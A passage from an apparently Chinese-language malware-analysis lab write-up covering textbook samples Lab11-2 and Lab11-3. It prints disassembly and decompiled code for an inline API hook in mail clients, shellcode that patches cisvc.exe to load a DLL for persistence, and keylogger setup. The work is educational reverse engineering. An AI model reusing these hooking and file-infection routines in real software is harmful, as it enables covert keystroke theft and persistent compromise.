class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:10001203                 push    ebp<br>.text:10001204                 mov     ebp, esp<br>.text:10001206                 sub     esp, 0Ch<br>.text:10001209                 mov     eax, [ebp+arg_4]<br>.text:1000120C                 sub     eax, [ebp+lpAddress]<br>.text:1000120F                 sub     eax, 5<br>.text:10001212                 mov     [ebp+var_4], eax<br>.text:10001215                 lea     ecx, [ebp+flOldProtect]<br>.text:10001218                 push    ecx             ; lpflOldProtect<br>.text:10001219                 push    40h             ; flNewProtect<br>.text:1000121B                 push    5               ; dwSize<br>.text:1000121D                 mov     edx, [ebp+lpAddress]<br>.text:10001220                 push    edx             ; lpAddress<br>.text:10001221                 call    ds:VirtualProtect<br>.text:10001227                 push    0FFh            ; Size<br>.text:1000122C                 call    malloc<br>.text:10001231                 add     esp, 4<br>.text:10001234                 mov     [ebp+var_8], eax<br>.text:10001237                 mov     eax, [ebp+var_8]<br>.text:1000123A                 mov     ecx, [ebp+lpAddress]<br>.text:1000123D                 mov     [eax], ecx<br>.text:1000123F                 mov     edx, [ebp+var_8]<br>.text:10001242                 mov     byte ptr [edx+4], 5<br>.text:10001246                 push    5               ; Size<br>.text:10001248                 mov     eax, [ebp+lpAddress]<br>.text:1000124B                 push    eax             ; Src<br>.text:1000124C                 mov     ecx, [ebp+var_8]<br>.text:1000124F                 add     ecx, 5<br>.text:10001252                 push    ecx             ; Dst<br>.text:10001253                 call    memcpy<br>.text:10001258                 add     esp, 0Ch<br>.text:1000125B                 mov     edx, [ebp+var_8]<br>.text:1000125E                 mov     byte ptr [edx+0Ah], 0E9h<br>.text:10001262                 mov     eax, [ebp+lpAddress]<br>.text:10001265                 sub     eax, [ebp+var_8]<br>.text:10001268                 sub     eax, 0Ah<br>.text:1000126B                 mov     ecx, [ebp+var_8]<br>.text:1000126E                 mov     [ecx+0Bh], eax<br>.text:10001271                 mov     edx, [ebp+lpAddress]<br>.text:10001274                 mov     byte ptr [edx], 0E9h<br>.text:10001277                 mov     eax, [ebp+lpAddress]<br>.text:1000127A                 mov     ecx, [ebp+var_4]<br>.text:1000127D                 mov     [eax+1], ecx<br>.text:10001280                 lea     edx, [ebp+flOldProtect]<br>.text:10001283                 push    edx             ; lpflOldProtect<br>.text:10001284                 mov     eax, [ebp+flOldProtect]<br>.text:10001287                 push    eax             ; flNewProtect<br>.text:10001288                 push    5               ; dwSize<br>.text:1000128A                 mov     ecx, [ebp+lpAddress]<br>.text:1000128D                 push    ecx             ; lpAddress<br>.text:1000128E                 call    ds:VirtualProtect<br>.text:10001294                 mov     edx, [ebp+var_8]<br>.text:10001297                 add     edx, 5<br>.text:1000129A                 mov     eax, [ebp+arg_8]<br>.text:1000129D                 mov     [eax], edx<br>.text:1000129F                 mov     esp, ebp<br>.text:100012A1                 pop     ebp<br>.text:100012A2                 retn<br></code></pre></td></tr></table></figure><p><strong>7.哪个文件或者哪些进程执行这个恶意攻击。为什么？</strong></p><p>程序会对比当前进程名是否与<code>THEBAT.EXE</code>、<code>OUTLOOK.EXE</code>、<code>MSIMN.EXE</code>其中的任意一个相同，如果相同则运行恶意代码，否则退出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(Buf1, aThebatExe_0, v2)      <span class="hljs-comment">// THEBAT.EXE</span><br>        || (v3 = <span class="hljs-built_in">strlen</span>(aOutlookExe), !<span class="hljs-built_in">memcmp</span>(Buf1, aOutlookExe_0, v3))<span class="hljs-comment">// OUTLOOK.EXE</span><br>        || (v4 = <span class="hljs-built_in">strlen</span>(aMsimnExe), !<span class="hljs-built_in">memcmp</span>(Buf1, aMsimnExe_0, v4)) )<span class="hljs-comment">// MSIMN.EXE</span><br>      &#123;<br>        Proc_thread_sub_100013BD();<br>        sub_100012A3(ModuleName, aSend, sub_1000113D, &amp;dword_10003484);<br>        sub_10001499();<br>      &#125;<br></code></pre></td></tr></table></figure><p><strong>8.<code>.ini</code>文件的意义是什么？</strong></p><p>代码读取<code>.ini</code>文件中的数据，通过函数<code>sub_100010B3</code>进行解密得出一个邮箱地址<code>billy@malwareanalysisbook.com</code>。</p><p><strong>9.你怎样使用WireShark动态抓取这个恶意代码的行为？</strong></p><p>打开<code>WireShark</code>并用<code>outlook</code>发送邮件。</p><h3 id="Lab11-3"><a href="#Lab11-3" class="headerlink" title="Lab11-3"></a>Lab11-3</h3><p><strong>分析恶意代码Lab11-03.exe和Lab11-03.dll。确保这两个文件在分析时位于同一个目录中。</strong></p><p><strong>问题</strong></p><p><strong>1.使用基础的静态分析过程，你可以发现什么有趣的线索？</strong></p><p>在Lab11-03.exe中发现了一些有意思的字符串：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">AddressLengthTypeString<br>.rdata:<span class="hljs-number">004080E8</span><span class="hljs-number">00000008</span>Ccmd.exe<br>.rdata:<span class="hljs-number">004080F0</span><span class="hljs-number">0000000</span>CCcommand.com<br>.rdata:<span class="hljs-number">00408100</span><span class="hljs-number">00000008</span>CCOMSPEC<br>.rdata:<span class="hljs-number">00408118</span><span class="hljs-number">00000005</span>CPATH<br>.rdata:<span class="hljs-number">00408128</span><span class="hljs-number">00000005</span>C.exe<br>.rdata:<span class="hljs-number">00408130</span><span class="hljs-number">00000005</span>C.bat<br>.rdata:<span class="hljs-number">00408138</span><span class="hljs-number">00000005</span>C.cmd<br>.data:<span class="hljs-number">00409139</span><span class="hljs-number">00000024</span>CC:\\WINDOWS\\System32\\inet_epar32.dll<br>.data:<span class="hljs-number">0040915</span>D<span class="hljs-number">0000000</span>CCzzz<span class="hljs-number">69806582</span><br>.data:<span class="hljs-number">00409174</span><span class="hljs-number">00000010</span>Cnet start cisvc<br>.data:<span class="hljs-number">00409184</span><span class="hljs-number">00000017</span>CC:\\WINDOWS\\System32\\%s<br>.data:<span class="hljs-number">0040919</span>C<span class="hljs-number">0000000</span><span class="hljs-keyword">A</span>Ccisvc.exe<br>.data:<span class="hljs-number">004091A8</span><span class="hljs-number">0000000</span>DCLab11-<span class="hljs-number">03</span>.dll<br>.data:<span class="hljs-number">004091B8</span><span class="hljs-number">00000024</span>CC:\\WINDOWS\\System32\\inet_epar32.dll<br></code></pre></td></tr></table></figure><p>Lab11-03.dll中的字符串：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs dns">.rdata:<span class="hljs-number">1000754</span>C<span class="hljs-number">00000008</span>CH:mm:ss<br>.rdata:<span class="hljs-number">10007554</span><span class="hljs-number">00000014</span>Cdddd, MMMM dd, yyyy<br>.rdata:<span class="hljs-number">10007568</span><span class="hljs-number">00000007</span>CM/d/yy<br>.rdata:<span class="hljs-number">10007578</span><span class="hljs-number">00000009</span>CDecember<br>.rdata:<span class="hljs-number">10007584</span><span class="hljs-number">00000009</span>CNovember<br>.rdata:<span class="hljs-number">10007590</span><span class="hljs-number">00000008</span>COctober<br>.rdata:<span class="hljs-number">10007598</span><span class="hljs-number">0000000</span><span class="hljs-keyword">A</span>CSeptember<br>.rdata:<span class="hljs-number">100075A4</span><span class="hljs-number">00000007</span>CAugust<br>.rdata:<span class="hljs-number">100075</span>AC<span class="hljs-number">00000005</span>CJuly<br>.rdata:<span class="hljs-number">100075B4</span><span class="hljs-number">00000005</span>CJune<br>.rdata:<span class="hljs-number">100075</span>BC<span class="hljs-number">00000006</span>CApril<br>.rdata:<span class="hljs-number">100075C4</span><span class="hljs-number">00000006</span>CMarch<br>.rdata:<span class="hljs-number">100075</span>CC<span class="hljs-number">00000009</span>CFebruary<br>.rdata:<span class="hljs-number">100075D8</span><span class="hljs-number">00000008</span>CJanuary<br>.rdata:<span class="hljs-number">10007610</span><span class="hljs-number">00000009</span>CSaturday<br>.rdata:<span class="hljs-number">1000761</span>C<span class="hljs-number">00000007</span>CFriday<br>.rdata:<span class="hljs-number">10007624</span><span class="hljs-number">00000009</span>CThursday<br>.rdata:<span class="hljs-number">10007630</span><span class="hljs-number">0000000</span><span class="hljs-keyword">A</span>CWednesday<br>.rdata:<span class="hljs-number">1000763</span>C<span class="hljs-number">00000008</span>CTuesday<br>.rdata:<span class="hljs-number">10007644</span><span class="hljs-number">00000007</span>CMonday<br>.rdata:<span class="hljs-number">1000764</span>C<span class="hljs-number">00000007</span>CSunday<br>.rdata:<span class="hljs-number">10007670</span><span class="hljs-number">00000016</span>CSunMonTueWedThuFriSat<br>.rdata:<span class="hljs-number">10007688</span><span class="hljs-number">00000025</span>CJanFebMarAprMayJunJulAugSepOctNovDec<br>.rdata:<span class="hljs-number">1000785</span>C<span class="hljs-number">0000000</span>DCKERNEL32.dll<br>.rdata:<span class="hljs-number">100078A6</span><span class="hljs-number">0000000</span>BCUSER32.dll<br>.rdata:<span class="hljs-number">10007C82</span><span class="hljs-number">0000000</span>FCLab1103dll.dll<br>.rdata:<span class="hljs-number">10007C91</span><span class="hljs-number">0000000</span>CCzzz<span class="hljs-number">69806582</span><br>.data:<span class="hljs-number">10008030</span><span class="hljs-number">00000006</span>C<span class="hljs-number">0</span>x%x <br>.data:<span class="hljs-number">10008038</span><span class="hljs-number">00000009</span>C&lt;SHIFT&gt; <br>.data:<span class="hljs-number">10008044</span><span class="hljs-number">00000008</span>C%s: %s\n<br>.data:<span class="hljs-number">1000804</span>C<span class="hljs-number">00000022</span>CC:\\WINDOWS\\System32\\kernel64x.dll<br></code></pre></td></tr></table></figure><p>程序导入了<code>GetAsyncKeyState</code>函数，因此可能是一个键盘窃听器。</p><p><strong>2.当运行这个恶意代码时，发生了什么？</strong></p><p>运行<code>ProcessMonitor</code>并运行这个恶意代码可以找出如下行为：</p><ul><li>程序将自身复制到<code>C:\\WINDOWS\\System32\\inet_epar32.dll</code></li><li>对文件<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>进行写操作</li><li>对文件<code>C:\\WINDOWS\\System32\\cisvc.exe</code>进行写操作</li></ul><p><strong>3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？</strong></p><p>将Lab11-03.exe加载到IDA中可以看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  CHAR FileName; <span class="hljs-comment">// [esp+0h] [ebp-104h]</span><br><br>  CopyFileA(ExistingFileName, NewFileName, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">sprintf</span>(&amp;FileName, aCWindowsSystem_0, aCisvcExe);<br>  sub_401070(&amp;FileName);<br>  system(aNetStartCisvc);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序先将<code>Lab11-03.dll</code>拷贝到<code>C:\WINDOWS\System32\inet_epar32.dll</code>，然后又打开了<code>cisvc.exe</code>的句柄，将此句柄作为函数 <code>sub_401070</code>的参数门之后又使用<code>net start cisvc</code>命令启动了<code>cisvc</code>服务，结合之前的分析我们可以猜测恶意代码对<code>cisvc</code>进行了修改，因此把分析的重点放到函数<code>sub_401070</code>上。</p><p>从IDA为 <code>sub_401070</code>生成的伪c代码来看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401070</span><span class="hljs-params">(LPCSTR lpFileName)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  HANDLE hFile; <span class="hljs-comment">// [esp+Ch] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+10h] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+14h] [ebp-24h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+18h] [ebp-20h]</span><br>  _DWORD *v6; <span class="hljs-comment">// [esp+24h] [ebp-14h]</span><br>  DWORD dwMaximumSizeLow; <span class="hljs-comment">// [esp+28h] [ebp-10h]</span><br>  HANDLE hFileMappingObject; <span class="hljs-comment">// [esp+2Ch] [ebp-Ch]</span><br>  _DWORD *lpBaseAddress; <span class="hljs-comment">// [esp+34h] [ebp-4h]</span><br><br>  hFile = CreateFileA(lpFileName, <span class="hljs-number">0xC0000000</span>, <span class="hljs-number">1u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4u</span>, <span class="hljs-number">0x80</span>u, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( hFile == <span class="hljs-number">-1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  dwMaximumSizeLow = GetFileSize(hFile, <span class="hljs-number">0</span>);<br>  hFileMappingObject = CreateFileMappingA(hFile, <span class="hljs-number">0</span>, <span class="hljs-number">4u</span>, <span class="hljs-number">0</span>, dwMaximumSizeLow, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( hFileMappingObject == <span class="hljs-number">-1</span> )<br>  &#123;<br>    CloseHandle(hFile);<br>    result = <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    lpBaseAddress = MapViewOfFile(hFileMappingObject, <span class="hljs-number">6u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, dwMaximumSizeLow);<br>    <span class="hljs-keyword">if</span> ( lpBaseAddress )<br>    &#123;<br>      v4 = lpBaseAddress + lpBaseAddress[<span class="hljs-number">15</span>];<br>      v6 = sub_401000((v4 + *(v4 + <span class="hljs-number">20</span>) + <span class="hljs-number">24</span>), *(v4 + <span class="hljs-number">6</span>));<br>      <span class="hljs-keyword">if</span> ( v6 )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(v4 + <span class="hljs-number">40</span>) )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( v6[<span class="hljs-number">4</span>] &gt; <span class="hljs-number">0x13A</span>u )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( (v6[<span class="hljs-number">4</span>] - v6[<span class="hljs-number">2</span>]) &gt;= <span class="hljs-number">0x13A</span> )<br>            &#123;<br>              v3 = v6[<span class="hljs-number">2</span>] + v6[<span class="hljs-number">5</span>];<br>              <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x13A</span>; ++i )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( *(&amp;dword_409030 + i) == <span class="hljs-number">0x78</span><br>                  &amp;&amp; *(&amp;dword_409030 + i + <span class="hljs-number">1</span>) == <span class="hljs-number">0x56</span><br>                  &amp;&amp; *(&amp;dword_409030 + i + <span class="hljs-number">2</span>) == <span class="hljs-number">0x34</span><br>                  &amp;&amp; *(&amp;dword_409030 + i + <span class="hljs-number">3</span>) == <span class="hljs-number">0x12</span> )<br>                &#123;<br>                  *(&amp;dword_409030 + i) = v6[<span class="hljs-number">5</span>] + *(v4 + <span class="hljs-number">40</span>) - *(v4 + <span class="hljs-number">44</span>) - (v3 + i + <span class="hljs-number">4</span>);<br>                  <span class="hljs-keyword">break</span>;<br>                &#125;<br>              &#125;<br>              qmemcpy(lpBaseAddress + v3, &amp;dword_409030, <span class="hljs-number">0x13A</span>u);<br>              *(v4 + <span class="hljs-number">40</span>) = *(v4 + <span class="hljs-number">44</span>) + v3 - v6[<span class="hljs-number">5</span>];<br>              CloseHandle(hFile);<br>              CloseHandle(hFileMappingObject);<br>              UnmapViewOfFile(lpBaseAddress);<br>              result = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              result = <span class="hljs-number">-1</span>;<br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            result = <span class="hljs-number">-1</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          result = <span class="hljs-number">-1</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        CloseHandle(hFile);<br>        CloseHandle(hFileMappingObject);<br>        UnmapViewOfFile(lpBaseAddress);<br>        result = <span class="hljs-number">-1</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      CloseHandle(hFile);<br>      CloseHandle(hFileMappingObject);<br>      UnmapViewOfFile(<span class="hljs-number">0</span>);<br>      result = <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数将文件<code>cisvc.exe</code>映射到内存之后对此文件进行了一些列的修改行为，但是由于代码又很多混淆，不容易进行静态分析，因此需要进行动态分析，载入OD中函数sub_401070下断点并进行单步调试，发现Lab11-03.exe会先查找<code>cisvc.exe</code>的PE头再查找到.text，然后在此位置有一个较为复杂的循环写值的操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004011FF                 cmp     [ebp+var_20], 13Ah<br>.text:00401206                 jnb     short loc_40127C<br>.text:00401208                 mov     edx, [ebp+var_20]<br>.text:0040120B                 xor     eax, eax<br>.text:0040120D                 mov     al, byte ptr dword_409030[edx] ; shellcode<br>.text:00401213                 cmp     eax, 78h<br>.text:00401216                 jnz     short loc_401277<br>.text:00401218                 mov     ecx, [ebp+var_20]<br>.text:0040121B                 xor     edx, edx<br>.text:0040121D                 mov     dl, byte ptr (dword_409030+1)[ecx]<br>.text:00401223                 cmp     edx, 56h<br>.text:00401226                 jnz     short loc_401277<br>.text:00401228                 mov     eax, [ebp+var_20]<br>.text:0040122B                 xor     ecx, ecx<br>.text:0040122D                 mov     cl, byte ptr (dword_409030+2)[eax]<br>.text:00401233                 cmp     ecx, 34h<br>.text:00401236                 jnz     short loc_401277<br>.text:00401238                 mov     edx, [ebp+var_20]<br>.text:0040123B                 xor     eax, eax<br>.text:0040123D                 mov     al, byte ptr (dword_409030+3)[edx]<br>.text:00401243                 cmp     eax, 12h<br>.text:00401246                 jnz     short loc_401277<br>.text:00401248                 mov     ecx, [ebp+var_24]<br>.text:0040124B                 mov     edx, [ecx+28h]<br>.text:0040124E                 mov     eax, [ebp+var_14]<br>.text:00401251                 add     edx, [eax+14h]<br>.text:00401254                 mov     ecx, [ebp+var_24]<br>.text:00401257                 sub     edx, [ecx+2Ch]<br>.text:0040125A                 mov     eax, [ebp+var_20]<br>.text:0040125D                 mov     ecx, [ebp+var_28]<br>.text:00401260                 lea     eax, [ecx+eax+4]<br>.text:00401264                 sub     edx, eax<br>.text:00401266                 mov     [ebp+var_30], edx<br>.text:00401269                 mov     ecx, [ebp+var_20]<br>.text:0040126C                 mov     edx, [ebp+var_30]<br>.text:0040126F                 mov     dword_409030[ecx], edx<br>.text:00401275                 jmp     short loc_40127C<br></code></pre></td></tr></table></figure><p>修改前：</p><p><img src="https://i.loli.net/2019/03/24/5c972de3c9b9f.png"></p><p>修改后：</p><p><img src="https://i.loli.net/2019/03/24/5c972df904409.png"></p><p>使用HexCmp工具查看这两个二进制文件的区别（淡红色区域）：</p><p><img src="https://i.loli.net/2019/03/24/5c972fa1d5de8.png"></p><p>经过一步一步对比发现这些新的shellcode是位于<code>004011FF</code>的代码进行的，恶意代码对此文件的入口点进行了修改，由原来的<code>129B</code>修改为了<code>1A28</code>:</p><p><img src="https://i.loli.net/2019/03/24/5c97323378bd9.png"></p><p>在OD中打开修改后的文件<code>cisvc.exe</code>看到如下<code>shellcode</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">01001B0A   .  FF55 FC       call dword ptr ss:[ebp-0x4]              ;  kernel32.LoadLibraryExA<br>01001B0D   .  8945 F0       mov dword ptr ss:[ebp-0x10],eax          ;  inet_epa.10000000<br>01001B10   .  8D83 24000000 lea eax,dword ptr ds:[ebx+0x24]<br>01001B16   .  50            push eax                                 ;  inet_epa.10000000<br>01001B17   .  8B45 F0       mov eax,dword ptr ss:[ebp-0x10]          ;  inet_epa.10000000<br>01001B1A   .  50            push eax                                 ;  inet_epa.10000000<br>01001B1B   .  FF55 F4       call dword ptr ss:[ebp-0xC]              ;  kernel32.GetProcAddress<br>01001B1E   .  8945 F8       mov dword ptr ss:[ebp-0x8],eax           ;  inet_epa.10000000<br>01001B21   .  FF55 F8       call dword ptr ss:[ebp-0x8]<br>01001B24   .  89EC          mov esp,ebp<br>01001B26   .  5D            pop ebp<br>01001B27   .^ E9 6FF7FFFF   jmp cisvc.0100129B<br></code></pre></td></tr></table></figure><p><code>cisvc.exe</code>现时使用<code>LoadLibrary</code>函数将<code>C:\WINDOWS\System32\inet_epar32.dll</code>加载到内存中然后获取导出函数<code>zzz69806582</code>的地址并执行此函数，之后在跳转到正常的程序入口点，从而使恶意代码达到长期驻留的目的。</p><p><strong>4.这个恶意代码感染Windows系统的哪个文件？</strong></p><p><code>cisvc.exe</code></p><p><strong>5.Lab11-03.dll做了什么？</strong></p><p>名为的导出函数<code>zzz69806582</code>创建了一个线程，我们集中分析这个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">zzz69806582</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数会创建一个<code>MZ</code>的互斥量:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    offset Name     ; &quot;MZ&quot;<br>push    0               ; bInheritHandle<br>push    1F0001h         ; dwDesiredAccess<br>call    ds:OpenMutexA<br></code></pre></td></tr></table></figure><p>将<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>加载到内存中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    0<br>push    80h             ; dwFlagsAndAttributes<br>push    4               ; dwCreationDisposition<br>push    0               ; lpSecurityAttributes<br>push    1               ; dwShareMode<br>push    0C0000000h      ; dwDesiredAccess<br>push    offset FileName ; &quot;C:\\WINDOWS\\System32\\kernel64x.dll&quot;<br>call    ds:CreateFileA<br></code></pre></td></tr></table></figure><p>将文件指针指向<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>的末尾：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    2<br>push    0               ; lpDistanceToMoveHigh<br>push    0               ; lDistanceToMove<br>mov     eax, [ebp+hFile]<br>push    eax             ; hFile<br>call    ds:SetFilePointer<br></code></pre></td></tr></table></figure><p>循环调用函数<code>sub_10001380</code>进行键盘敲击记录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_10001380</span><span class="hljs-params">(<span class="hljs-type">int</span> 